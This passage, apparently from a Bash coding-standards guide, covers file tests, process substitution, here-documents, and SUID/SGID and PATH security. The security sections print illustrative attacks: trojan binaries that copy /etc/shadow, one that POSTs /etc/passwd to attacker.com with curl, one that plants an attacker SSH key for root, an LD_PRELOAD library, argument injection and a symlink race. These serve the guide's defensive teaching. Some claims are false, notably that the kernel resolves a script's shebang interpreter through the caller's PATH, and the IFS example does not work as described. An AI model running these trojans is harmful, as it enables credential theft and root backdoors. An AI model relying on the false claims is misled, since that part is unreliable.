**Common patterns:**

\`\`\`bash
# Validate required file exists and is readable
validate_file() {
  local file=$1
  [[ -f "$file" ]] || die 2 "File not found: $file"
  [[ -r "$file" ]] || die 5 "Cannot read file: $file"
}

# Check if directory is writable
ensure_writable_dir() {
  local dir=$1
  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory: $dir"
  [[ -w "$dir" ]] || die 5 "Directory not writable: $dir"
}

# Only process if file was modified
process_if_modified() {
  local source=$1
  local marker=$2

  if [[ ! -f "$marker" ]] || [[ "$source" -nt "$marker" ]]; then
    process_file "$source"
    touch "$marker"
  else
    info "File $source not modified, skipping"
  fi
}

# Check if file is executable script
is_executable_script() {
  local file=$1
  [[ -f "$file" && -x "$file" && -s "$file" ]]
}

# Safe file sourcing
safe_source() {
  local file=$1
  if [[ -f "$file" ]]; then
    if [[ -r "$file" ]]; then
      source "$file"
    else
      warn "Cannot read file: $file"
      return 1
    fi
  else
    debug "File not found: $file (optional)"
    return 0
  fi
}
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - unquoted variable
[[ -f $file ]]  # Breaks with spaces or special chars

# ✓ Correct - always quote
[[ -f "$file" ]]

# ✗ Wrong - using old [ ] syntax
if [ -f "$file" ]; then
  cat "$file"
fi

# ✓ Correct - use [[ ]]
if [[ -f "$file" ]]; then
  cat "$file"
fi

# ✗ Wrong - not checking before use
source "$config"  # Error if file doesn't exist

# ✓ Correct - validate first
[[ -f "$config" ]] || die 3 "Config not found: $config"
[[ -r "$config" ]] || die 5 "Cannot read config: $config"
source "$config"

# ✗ Wrong - silent failure
[[ -d "$dir" ]] || mkdir "$dir"  # mkdir failure not caught

# ✓ Correct - check result
[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: $dir"
\`\`\`

**Combining file tests:**

\`\`\`bash
# Multiple conditions with AND
if [[ -f "$file" && -r "$file" && -s "$file" ]]; then
  info "Processing non-empty readable file: $file"
  process_file "$file"
fi

# Multiple conditions with OR
if [[ -f "$config1" ]]; then
  config_file=$config1
elif [[ -f "$config2" ]]; then
  config_file=$config2
else
  die 3 'No configuration file found'
fi

# Complex validation
validate_executable() {
  local script=$1

  [[ -e "$script" ]] || die 2 "File does not exist: $script"
  [[ -f "$script" ]] || die 22 "Not a regular file: $script"
  [[ -x "$script" ]] || die 126 "Not executable: $script"
  [[ -s "$script" ]] || die 22 "File is empty: $script"
}
\`\`\`


---


**Rule: BCS1102**

### Wildcard Expansion
Always use explicit path when doing wildcard expansion to avoid issues with filenames starting with \`-\`.

\`\`\`bash
# ✓ Correct - explicit path prevents flag interpretation
rm -v ./*
for file in ./*.txt; do
  process "$file"
done

# ✗ Incorrect - filenames starting with - become flags
rm -v *
\`\`\`


---


**Rule: BCS1103**

### Process Substitution

**Use process substitution `<(command)` and `>(command)` to provide command output as file-like inputs or to send data to commands as if writing to files. Process substitution eliminates the need for temporary files, avoids subshell issues with pipes, and enables powerful command composition patterns.**

**Rationale:**

- **No Temporary Files**: Eliminates need for creating, managing, and cleaning up temp files
- **Avoid Subshells**: Unlike pipes to while, process substitution preserves variable scope
- **Multiple Inputs**: Commands can read from multiple process substitutions simultaneously
- **Parallelism**: Multiple process substitutions run in parallel
- **Clean Syntax**: More readable than complex piping and temp file management
- **Resource Efficiency**: Data streams through FIFOs/file descriptors without disk I/O

**How process substitution works:**

Process substitution creates a temporary FIFO (named pipe) or file descriptor that connects command output to another command's input.

```bash
# >(command) - Output redirection
# Creates: /dev/fd/63 (or similar)
# Data written to this goes to command's stdin

# <(command) - Input redirection
# Creates: /dev/fd/63 (or similar)
# Data read from this comes from command's stdout

# Example visualization:
diff <(sort file1) <(sort file2)

# Bash expands to something like:
# diff /dev/fd/63 /dev/fd/64
# Where:
#   /dev/fd/63 contains output of: sort file1
#   /dev/fd/64 contains output of: sort file2
```

**Basic patterns:**

**1. Input process substitution `<(command)`:**

```bash
# Compare command outputs
diff <(ls dir1) <(ls dir2)

# Use command output as file
cat <(echo "Header") <(cat data.txt) <(echo "Footer")

# Feed command output to another command
grep pattern <(find /data -name '*.log')

# Multiple inputs
paste <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)
```

**2. Output process substitution `>(command)`:**

```bash
# Tee output to multiple commands
command | tee >(wc -l) >(grep ERROR) > output.txt

# Split output to different processes
generate_data | tee >(process_type1) >(process_type2) > /dev/null

# Send to command as if writing file
echo "data" > >(base64)
```

**Common use cases:**

**1. Comparing command outputs:**

```bash
# Compare sorted directory listings
diff <(ls -1 /dir1 | sort) <(ls -1 /dir2 | sort)

# Compare file checksums
diff <(sha256sum /backup/file) <(sha256sum /original/file)

# Compare configuration
diff <(ssh host1 cat /etc/config) <(ssh host2 cat /etc/config)
```

**2. Reading command output into array:**

```bash
# ✓ BEST - readarray with process substitution
declare -a users
readarray -t users < <(getent passwd | cut -d: -f1)

# Array is populated correctly
echo "Users: ${#users[@]}"

# ✓ ALSO GOOD - null-delimited
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**3. Avoiding subshell in while loops:**

```bash
# ✓ CORRECT - Process substitution (no subshell)
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done < <(cat file.txt)

echo "Count: $count"  # Correct value!

# Compare with pipe (wrong - creates subshell):
# cat file.txt | while read -r line; do ...
```

**4. Multiple simultaneous inputs:**

```bash
# Read from multiple sources
while IFS= read -r line1 <&3 && IFS= read -r line2 <&4; do
  echo "File1: $line1"
  echo "File2: $line2"
done 3< <(cat file1.txt) 4< <(cat file2.txt)

# Merge sorted files
sort -m <(sort file1) <(sort file2) <(sort file3)
```

**5. Parallel processing with tee:**

```bash
# Process log file multiple ways simultaneously
cat logfile.txt | tee \
  >(grep ERROR > errors.log) \
  >(grep WARN > warnings.log) \
  >(wc -l > line_count.txt) \
  > all_output.log
```

**Complete examples:**

**Example 1: Configuration comparison:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Compare configs on multiple servers
compare_configs() {
  local -a servers=("$@")
  local -- config_file='/etc/myapp/config.conf'

  if [[ ${#servers[@]} -lt 2 ]]; then
    error 'Need at least 2 servers to compare'
    return 22
  fi

  info "Comparing $config_file across ${#servers[@]} servers"

  # Compare first two servers
  local -- server1="${servers[0]}"
  local -- server2="${servers[1]}"

  diff \
    <(ssh "$server1" "cat $config_file 2>/dev/null || echo 'NOT FOUND'") \
    <(ssh "$server2" "cat $config_file 2>/dev/null || echo 'NOT FOUND'")

  local -i diff_exit=$?

  if ((diff_exit == 0)); then
    success "Configs are identical on $server1 and $server2"
  else
    warn "Configs differ between $server1 and $server2"
  fi

  return "$diff_exit"
}

main() {
  compare_configs 'server1.example.com' 'server2.example.com'
}

main "$@"

#fin
```

**Example 2: Log analysis with parallel processing:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Analyze log file in parallel
analyze_log() {
  local -- log_file="$1"
  local -- output_dir="${2:-.}"

  info "Analyzing $log_file..."

  # Process log file multiple ways simultaneously
  cat "$log_file" | tee \
    >(grep 'ERROR' | sort -u > "$output_dir/errors.txt") \
    >(grep 'WARN' | sort -u > "$output_dir/warnings.txt") \
    >(awk '{print $1}' | sort -u > "$output_dir/unique_timestamps.txt") \
    >(wc -l > "$output_dir/line_count.txt") \
    > "$output_dir/full_log.txt"

  # Wait for all background processes
  wait

  # Report results
  local -i error_count warn_count total_lines

  error_count=$(wc -l < "$output_dir/errors.txt")
  warn_count=$(wc -l < "$output_dir/warnings.txt")
  total_lines=$(cat "$output_dir/line_count.txt")

  info "Analysis complete:"
  info "  Total lines: $total_lines"
  info "  Unique errors: $error_count"
  info "  Unique warnings: $warn_count"
}

main() {
  local -- log_file="${1:-/var/log/app.log}"
  analyze_log "$log_file"
}

main "$@"

#fin
```

**Example 3: Data merging with process substitution:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Merge and compare data from multiple sources
merge_user_data() {
  local -- source1="$1"
  local -- source2="$2"

  # Read users from multiple sources simultaneously
  local -a users1 users2

  readarray -t users1 < <(cut -d: -f1 "$source1" | sort -u)
  readarray -t users2 < <(cut -d: -f1 "$source2" | sort -u)

  info "Source 1: ${#users1[@]} users"
  info "Source 2: ${#users2[@]} users"

  # Find users in both
  local -a common
  readarray -t common < <(comm -12 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Find users only in source1
  local -a only_source1
  readarray -t only_source1 < <(comm -23 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Find users only in source2
  local -a only_source2
  readarray -t only_source2 < <(comm -13 <(printf '%s\n' "${users1[@]}") <(printf '%s\n' "${users2[@]}"))

  # Report
  info "Common users: ${#common[@]}"
  info "Only in source 1: ${#only_source1[@]}"
  info "Only in source 2: ${#only_source2[@]}"
}

main() {
  merge_user_data '/etc/passwd' '/backup/passwd'
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - using temp files instead
temp1=$(mktemp)
temp2=$(mktemp)
sort file1 > "$temp1"
sort file2 > "$temp2"
diff "$temp1" "$temp2"
rm "$temp1" "$temp2"

# ✓ Correct - process substitution (no temp files)
diff <(sort file1) <(sort file2)

# ✗ Wrong - pipe to while (subshell issue)
count=0
cat file | while read -r line; do
  ((count+=1))
done
echo "$count"  # Still 0!

# ✓ Correct - process substitution (no subshell)
count=0
while read -r line; do
  ((count+=1))
done < <(cat file)
echo "$count"  # Correct value!

# ✗ Wrong - sequential processing
cat log | grep ERROR > errors.txt
cat log | grep WARN > warnings.txt
cat log | wc -l > count.txt
# Reads file 3 times!

# ✓ Correct - parallel with tee and process substitution
cat log | tee \
  >(grep ERROR > errors.txt) \
  >(grep WARN > warnings.txt) \
  >(wc -l > count.txt) \
  > /dev/null
# Reads file once, processes in parallel

# ✗ Wrong - not quoting process substitution
diff <(sort $file1) <(sort $file2)  # Word splitting!

# ✓ Correct - quote variables
diff <(sort "$file1") <(sort "$file2")

# ✗ Wrong - forgetting error handling
diff <(failing_command) file
# If failing_command fails, diff gets empty input

# ✓ Correct - check command success
if temp_output=$(failing_command); then
  diff <(echo "$temp_output") file
else
  die 1 'Command failed'
fi
```

**Edge cases and advanced patterns:**

**1. File descriptor assignment:**

```bash
# Assign process substitution to file descriptor
exec 3< <(long_running_command)

# Read from it later
while IFS= read -r line <&3; do
  echo "$line"
done

# Close when done
exec 3<&-
```

**2. Multiple outputs with tee:**

```bash
# Send different data to different commands
{
  echo "type1: data1"
  echo "type2: data2"
  echo "type1: data3"
} | tee \
  >(grep 'type1' > type1.log) \
  >(grep 'type2' > type2.log) \
  > all.log
```

**3. Combining with here-strings:**

```bash
# Pass variable through process
var="hello world"
result=$(tr '[:lower:]' '[:upper:]' < <(echo "$var"))
echo "$result"  # HELLO WORLD

# Or with here-string (simpler for variables)
result=$(tr '[:lower:]' '[:upper:]' <<< "$var")
```

**4. Process substitution with diff:**

```bash
# Compare sorted JSON
diff \
  <(jq -S . file1.json) \
  <(jq -S . file2.json)

# Compare command output against expected
diff \
  <(my_command --output) \
  <(echo "expected output")
```

**5. NULL-delimited with process substitution:**

```bash
# Handle filenames with spaces/newlines
while IFS= read -r -d '' file; do
  echo "Processing: $file"
done < <(find /data -type f -print0)

# With readarray
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)
```

**6. Nested process substitution:**

```bash
# Complex data processing
diff \
  <(sort <(grep pattern file1)) \
  <(sort <(grep pattern file2))

# Process chains
cat <(echo "header") <(sort <(grep -v '^#' data.txt)) <(echo "footer")
```

**Testing process substitution:**

```bash
# Test that process substitution works
test_process_substitution() {
  # Should create file-like object
  local -- test_file
  test_file=$(echo <(echo "test"))

  if [[ -e "$test_file" ]]; then
    info "Process substitution creates: $test_file"
  else
    error "Process substitution not working"
    return 1
  fi

  # Test reading
  local -- content
  content=$(cat <(echo "hello"))

  if [[ "$content" == "hello" ]]; then
    info "Process substitution read test: PASS"
  else
    error "Expected 'hello', got: $content"
    return 1
  fi
}

# Test avoiding subshell
test_subshell_avoidance() {
  local -i count=0

  while read -r line; do
    ((count+=1))
  done < <(echo -e "a\nb\nc")

  if ((count == 3)); then
    info "Subshell avoidance test: PASS (count=$count)"
  else
    error "Expected count=3, got count=$count"
    return 1
  fi
}

test_process_substitution
test_subshell_avoidance
```

**When NOT to use process substitution:**

```bash
# Simple command output - command substitution is clearer
# ✗ Overcomplicated
result=$(cat <(command))

# ✓ Simpler
result=$(command)

# Single file input - direct redirection is clearer
# ✗ Overcomplicated
grep pattern < <(cat file)

# ✓ Simpler
grep pattern < file
# Or:
grep pattern file

# Variable expansion - use here-string
# ✗ Overcomplicated
command < <(echo "$variable")

# ✓ Simpler
command <<< "$variable"
```

**Summary:**

- **Use `<(command)` for input** - treats command output as readable file
- **Use `>(command)` for output** - treats command as writable file
- **Eliminates temp files** - data streams through FIFOs/file descriptors
- **Avoids subshells** - unlike pipes, preserves variable scope
- **Enables parallelism** - multiple substitutions run simultaneously
- **Multiple inputs** - commands can read from several process substitutions
- **Works with diff, comm, paste** - any command accepting file arguments
- **Quote variables** - inside process substitution, quote like normal
- **Combine with tee** - for parallel output processing

**Key principle:** Process substitution is Bash's answer to "I need this command's output to look like a file." It's more efficient than temp files, safer than pipes (no subshell), and enables powerful data processing patterns. When you find yourself creating temp files just to pass data between commands, process substitution is almost always the better solution.


---


**Rule: BCS1104**

### Here Documents
Use for multi-line strings or input.

\`\`\`bash
# No variable expansion (note single quotes)
cat <<'EOF'
This is a multi-line
string with no variable
expansion.
EOF

# With variable expansion
cat <<EOF
User: $USER
Home: $HOME
EOF
\`\`\`


---


**Rule: BCS1201**

### SUID/SGID

**Never use SUID (Set User ID) or SGID (Set Group ID) bits on Bash scripts. This is a critical security prohibition with no exceptions.**

```bash
# ✗ NEVER do this - catastrophically dangerous
chmod u+s /usr/local/bin/myscript.sh  # SUID
chmod g+s /usr/local/bin/myscript.sh  # SGID

# ✓ Correct - use sudo for elevated privileges
sudo /usr/local/bin/myscript.sh

# ✓ Correct - configure sudoers for specific commands
# In /etc/sudoers:
# username ALL=(ALL) NOPASSWD: /usr/local/bin/myscript.sh
```

**Rationale:**

- **IFS Exploitation**: Attacker can set `IFS` to control word splitting, causing commands to execute with elevated privileges
- **PATH Manipulation**: Even if you set `PATH` in the script, the kernel uses the caller's `PATH` to find the interpreter, allowing trojan attacks
- **Library Injection**: `LD_PRELOAD` and `LD_LIBRARY_PATH` can inject malicious code before script execution
- **Shell Expansion**: Bash performs multiple expansions (brace, tilde, parameter, command substitution, glob) that can be exploited
- **Race Conditions**: TOCTOU (Time Of Check, Time Of Use) vulnerabilities in file operations
- **Interpreter Vulnerabilities**: Bugs in bash itself can be exploited when running with elevated privileges
- **No Compilation**: Unlike compiled programs, script source is readable and modifiable, increasing attack surface

**Why SUID/SGID bits are dangerous on shell scripts:**

SUID/SGID bits change the effective user/group ID to the file owner's UID/GID during execution. For compiled binaries, the kernel loads and executes machine code directly. For shell scripts, the kernel:

1. Reads the shebang (`#!/bin/bash`)
2. Executes the interpreter (`/bin/bash`) with the script as argument
3. The interpreter inherits SUID/SGID privileges
4. The interpreter then processes the script, performing expansions and executing commands

This multi-step process creates numerous attack vectors that don't exist for compiled programs.

**Specific attack examples:**

**1. IFS Exploitation:**

```bash
# Vulnerable SUID script (owned by root)
#!/bin/bash
# /usr/local/bin/vulnerable.sh (SUID root)
set -euo pipefail

# Intended: Check if service is running
service_name="$1"
status=$(systemctl status "$service_name")
echo "$status"
```

**Attack:**
```bash
# Attacker sets IFS to slash
export IFS='/'
./vulnerable.sh "../../etc/shadow"

# With IFS='/', the path is split into words
# systemctl status "../../etc/shadow" might be interpreted as:
# systemctl status ".." ".." "etc" "shadow"
# Depending on systemctl's argument parsing, this could expose sensitive files
```

**2. PATH Attack (interpreter resolution):**

```bash
# SUID script: /usr/local/bin/backup.sh (owned by root)
#!/bin/bash
set -euo pipefail
PATH=/usr/bin:/bin  # Script sets secure PATH

tar -czf /backup/data.tar.gz /var/data
```

**Attack:**
```bash
# Attacker creates malicious bash
mkdir /tmp/evil
cat > /tmp/evil/bash << 'EOF'
#!/bin/bash
# Copy root's SSH keys
cp -r /root/.ssh /tmp/stolen_keys
# Now execute the real script
exec /bin/bash "$@"
EOF
chmod +x /tmp/evil/bash

# Attacker manipulates PATH before executing SUID script
export PATH=/tmp/evil:$PATH
/usr/local/bin/backup.sh

# The kernel uses the caller's PATH to find the interpreter!
# It executes /tmp/evil/bash with SUID privileges
# Attacker's code runs as root BEFORE the script's PATH is set
```

**3. Library Injection Attack:**

```bash
# SUID script: /usr/local/bin/report.sh
#!/bin/bash
set -euo pipefail

# Generate system report
echo "System Report" > /root/report.txt
df -h >> /root/report.txt
```

**Attack:**
```bash
# Attacker creates malicious shared library
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init(void) {
    // Runs before main() / script execution
    if (geteuid() == 0) {
        system("cp /etc/shadow /tmp/shadow_copy");
        system("chmod 644 /tmp/shadow_copy");
    }
}
EOF

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c

# Execute SUID script with malicious library preloaded
LD_PRELOAD=/tmp/evil.so /usr/local/bin/report.sh

# The malicious library runs with root privileges before the script
```

**4. Command Injection via Unquoted Variables:**

```bash
# Vulnerable SUID script
#!/bin/bash
# /usr/local/bin/cleaner.sh (SUID root)

directory="$1"
# Intended to clean old files
find "$directory" -type f -mtime +30 -delete
```

**Attack:**
```bash
# Attacker injects commands through directory name
/usr/local/bin/cleaner.sh "/tmp -o -name 'shadow' -exec cat /etc/shadow > /tmp/shadow_copy \;"

# The injected find command becomes:
# find /tmp -o -name 'shadow' -exec cat /etc/shadow > /tmp/shadow_copy \; -type f -mtime +30 -delete
# This bypasses the intended logic and exfiltrates /etc/shadow
```

**5. Symlink Race Condition:**

```bash
# Vulnerable SUID script
#!/bin/bash
# /usr/local/bin/secure_write.sh (SUID root)
set -euo pipefail

output_file="$1"

# Check if file is safe to write
if [[ -f "$output_file" ]]; then
  die 1 'File already exists'
fi

# Race condition window here!
# Write sensitive data
echo "secret data" > "$output_file"
```

**Attack:**
```bash
# Terminal 1: Run script repeatedly
while true; do
  /usr/local/bin/secure_write.sh /tmp/output 2>/dev/null && break
done

# Terminal 2: Create symlink in the race window
while true; do
  rm -f /tmp/output
  ln -s /etc/passwd /tmp/output
done

# If timing is right, the script writes to /etc/passwd!
```

**Safe alternatives to SUID/SGID scripts:**

**1. Use sudo with configured permissions:**

```bash
# /etc/sudoers.d/myapp
# Allow specific user to run specific script as root
username ALL=(root) NOPASSWD: /usr/local/bin/myapp.sh

# Allow group to run script with specific arguments
%admin ALL=(root) /usr/local/bin/backup.sh --backup-only
```

**2. Use capabilities instead of full SUID:**

```bash
# For compiled programs (not scripts), use capabilities
# Grant only specific privileges needed
setcap cap_net_bind_service=+ep /usr/local/bin/myserver

# This allows binding to ports < 1024 without full root
```

**3. Use a setuid wrapper (compiled C program):**

```bash
# Wrapper validates input, then executes script as root
# /usr/local/bin/backup_wrapper.c (compiled and SUID)
int main(int argc, char *argv[]) {
    // Validate arguments
    if (argc != 2) return 1;

    // Sanitize PATH
    setenv("PATH", "/usr/bin:/bin", 1);

    // Clear dangerous environment variables
    unsetenv("LD_PRELOAD");
    unsetenv("LD_LIBRARY_PATH");
    unsetenv("IFS");

    // Execute script with validated environment
    execl("/usr/local/bin/backup.sh", "backup.sh", argv[1], NULL);
    return 1;
}
```

**4. Use PolicyKit (pkexec) for GUI applications:**

```bash
# Define policy action in /usr/share/polkit-1/actions/
# Use pkexec to execute with elevated privileges
pkexec /usr/local/bin/system-config.sh
```

**5. Use systemd service with elevated privileges:**

```bash
# /etc/systemd/system/myapp.service
[Unit]
Description=My Application Service

[Service]
Type=oneshot
User=root
ExecStart=/usr/local/bin/myapp.sh
RemainAfterExit=no

# User triggers via systemctl (requires appropriate PolicyKit policy)
systemctl start myapp.service
```

**Detection and prevention:**

**Find SUID/SGID shell scripts on your system:**
```bash
# Search for SUID/SGID scripts (should return nothing!)
find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \; | grep -i script

# List all SUID files (review carefully)
find / -type f -perm -4000 -ls 2>/dev/null

# List all SGID files
find / -type f -perm -2000 -ls 2>/dev/null
```

**Prevent accidental SUID on scripts:**
```bash
# Modern Linux kernels ignore SUID on scripts, but don't rely on this
# Many Unix variants still honor SUID on scripts

# In your deployment scripts, explicitly ensure no SUID:
install -m 755 myscript.sh /usr/local/bin/
# Never use -m 4755 or chmod u+s on shell scripts
```

**Why sudo is safer:**

```bash
# ✓ Sudo provides multiple safety features:
# 1. Logging: All sudo commands are logged to /var/log/auth.log
# 2. Timeout: Credentials expire after 15 minutes
# 3. Granular control: Specific commands, arguments, users
# 4. Environment sanitization: Clears dangerous variables by default
# 5. Audit trail: Who ran what, when

# Configure specific commands in /etc/sudoers.d/myapp
username ALL=(root) NOPASSWD: /usr/local/bin/backup.sh
username ALL=(root) /usr/local/bin/restore.sh *

# User runs:
sudo /usr/local/bin/backup.sh
# Logged: "username : TTY=pts/0 ; PWD=/home/username ; USER=root ; COMMAND=/usr/local/bin/backup.sh"
```

**Real-world security incident example:**

In the early 2000s, many Unix systems had SUID root shell scripts for system administration tasks. Attackers exploited these through:
- IFS manipulation to execute arbitrary commands
- PATH attacks to substitute malicious interpreters
- Race conditions in temporary file handling
- Command injection through unchecked user input

Modern Linux distributions (since ~2005) ignore SUID bits on scripts by default, but:
- Many Unix variants still honor them
- Legacy systems may be vulnerable
- Scripts deployed to unknown systems may be exploited
- The practice itself is fundamentally unsafe

**Summary:**

- **Never** use SUID or SGID on shell scripts under any circumstances
- Shell scripts have too many attack vectors to be safe with elevated privileges
- Use `sudo` with carefully configured permissions instead
- For compiled programs needing specific privileges, use capabilities
- Use setuid wrappers (compiled C) if you absolutely must execute a script with privileges
- Audit your systems regularly for SUID/SGID scripts: `find / -type f \( -perm -4000 -o -perm -2000 \) -exec file {} \;`
- Remember: Convenience is never worth the security risk of SUID shell scripts

**Key principle:** If you think you need SUID on a shell script, you're solving the wrong problem. Redesign your solution using sudo, PolicyKit, systemd services, or a compiled wrapper.


---


**Rule: BCS1202**

### PATH Security

**Always secure the PATH variable to prevent command substitution attacks and trojan binary injection. An insecure PATH is one of the most common attack vectors in shell scripts.**

**Rationale:**

- **Command Hijacking**: Attacker-controlled directories in PATH allow malicious binaries to replace system commands
- **Current Directory Risk**: `.` or empty elements in PATH cause commands to execute from the current directory
- **Privilege Escalation**: Scripts running with elevated privileges can be tricked into executing attacker code
- **Search Order Matters**: Earlier directories in PATH are searched first, allowing priority-based attacks
- **Environment Inheritance**: PATH is inherited from the caller's environment, which may be malicious
- **Defense in Depth**: Securing PATH is a critical layer of defense even when other precautions are taken

**Lock down PATH at script start:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - set secure PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH

# Rest of script uses locked-down PATH
command=$(which ls)  # Searches only trusted directories
\`\`\`

**Alternative: Validate existing PATH:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# ✓ Correct - validate PATH contains no dangerous elements
[[ "$PATH" =~ \.  ]] && die 1 'PATH contains current directory'
[[ "$PATH" =~ ^:  ]] && die 1 'PATH starts with empty element'
[[ "$PATH" =~ ::  ]] && die 1 'PATH contains empty element'
[[ "$PATH" =~ :$  ]] && die 1 'PATH ends with empty element'

# Additional checks for suspicious paths
[[ "$PATH" =~ /tmp ]] && die 1 'PATH contains /tmp'
[[ "$PATH" =~ ^/home ]] && die 1 'PATH starts with user home directory'
\`\`\`

**Attack Example 1: Current Directory in PATH**

\`\`\`bash
# Vulnerable script (doesn't set PATH)
#!/bin/bash
# /usr/local/bin/backup.sh
set -euo pipefail

# Script intends to use system ls
ls -la /etc > /tmp/backup_list.txt
\`\`\`

**Attack:**
\`\`\`bash
# Attacker creates malicious 'ls' in /tmp
cat > /tmp/ls << 'EOF'
#!/bin/bash
# Steal sensitive data
cp /etc/shadow /tmp/stolen_shadow
chmod 644 /tmp/stolen_shadow
# Now execute real ls to appear normal
/bin/ls "$@"
EOF
chmod +x /tmp/ls

# Attacker sets PATH with /tmp first
export PATH=/tmp:$PATH

# When victim runs backup script from /tmp:
cd /tmp
/usr/local/bin/backup.sh

# Script executes /tmp/ls instead of /bin/ls
# Attacker's code runs with script's privileges
\`\`\`

**Attack Example 2: Empty PATH Element**

\`\`\`bash
# PATH with empty element (double colon)
PATH=/usr/local/bin::/usr/bin:/bin

# Empty element is interpreted as current directory
# Same risk as PATH=.:/usr/local/bin:/usr/bin:/bin
\`\`\`

**Attack:**
\`\`\`bash
# Attacker creates malicious command in accessible directory
cat > ~/tar << 'EOF'
#!/bin/bash
# Exfiltrate data
curl -X POST -d @/etc/passwd https://attacker.com/collect
# Execute real command
/bin/tar "$@"
EOF
chmod +x ~/tar

# Vulnerable script runs from ~
cd ~
# With :: in PATH, searches current directory (~/tar found!)
tar -czf backup.tar.gz data/
\`\`\`

**Attack Example 3: Writable Directory in PATH**

\`\`\`bash
# PATH includes /opt/local/bin which is world-writable (misconfigured)
PATH=/opt/local/bin:/usr/local/bin:/usr/bin:/bin
\`\`\`

**Attack:**
\`\`\`bash
# Attacker creates trojan in writable PATH directory
cat > /opt/local/bin/ps << 'EOF'
#!/bin/bash
# Backdoor: Add SSH key for root access
mkdir -p /root/.ssh
echo "ssh-rsa AAAA... attacker@evil" >> /root/.ssh/authorized_keys
# Execute real ps
/bin/ps "$@"
EOF
chmod +x /opt/local/bin/ps

# When ANY script runs 'ps', attacker gains root access
\`\`\`

**Secure PATH patterns:**

**Pattern 1: Complete lockdown (recommended for security-critical scripts):**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

# Use commands with confidence
tar -czf /backup/data.tar.gz /var/data
systemctl restart nginx
\`\`\`

**Pattern 2: Full command paths (maximum security):**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# Don't rely on PATH at all - use absolute paths
/bin/tar -czf /backup/data.tar.gz /var/data
/usr/bin/systemctl restart nginx
/usr/bin/apt-get update

# Especially critical for common commands that might be trojaned
/bin/rm -rf /tmp/workdir
/bin/cat /etc/passwd | /bin/grep root
\`\`\`

**Pattern 3: PATH validation with fallback:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

validate_path() {
  # Check for dangerous PATH elements
  if [[ "$PATH" =~ \\.  ]] || \
     [[ "$PATH" =~ ^:  ]] || \
     [[ "$PATH" =~ ::  ]] || \
     [[ "$PATH" =~ :$  ]] || \
     [[ "$PATH" =~ /tmp ]]; then
    # PATH is suspicious, reset to safe default
    export PATH='/usr/local/bin:/usr/bin:/bin'
    readonly PATH
    warn 'Suspicious PATH detected, reset to safe default'
  fi
}

validate_path

# Rest of script
\`\`\`

**Pattern 4: Command verification:**

\`\`\`bash
#!/bin/bash
set -euo pipefail

# Verify critical commands are from expected locations
verify_command() {
  local cmd=$1
  local expected_path=$2
  local actual_path

  actual_path=$(command -v "$cmd")

  if [[ "$actual_path" != "$expected_path" ]]; then
    die 1 "Security: $cmd is $actual_path, expected $expected_path"
  fi
}

# Verify before using critical commands
verify_command tar /bin/tar
verify_command rm /bin/rm
verify_command systemctl /usr/bin/systemctl

# Now safe to use
tar -czf backup.tar.gz data/
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - trusting inherited PATH
#!/bin/bash
set -euo pipefail
# No PATH setting - inherits from environment
ls /etc  # Could execute trojan ls from anywhere in caller's PATH

# ✗ Wrong - PATH includes current directory
export PATH=.:$PATH
# Now any command can be hijacked from current directory

# ✗ Wrong - PATH includes /tmp
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin
# /tmp is world-writable, attacker can place trojans there

# ✗ Wrong - PATH includes user home directories
export PATH=/home/user/bin:$PATH
# Attacker may have write access to /home/user/bin

# ✗ Wrong - empty elements in PATH
export PATH=/usr/local/bin::/usr/bin:/bin  # :: is current directory
export PATH=:/usr/local/bin:/usr/bin:/bin  # Leading : is current directory
export PATH=/usr/local/bin:/usr/bin:/bin:  # Trailing : is current directory

# ✗ Wrong - setting PATH late in script
#!/bin/bash
set -euo pipefail
# Commands here use inherited PATH (dangerous!)
whoami
hostname
# Only now setting secure PATH (too late!)
export PATH='/usr/bin:/bin'

# ✓ Correct - set PATH at top of script
#!/bin/bash
set -euo pipefail
readonly PATH='/usr/local/bin:/usr/bin:/bin'
export PATH
# Now all commands use secure PATH
\`\`\`

**Edge case: Scripts that need custom paths:**

\`\`\`bash
#!/bin/bash
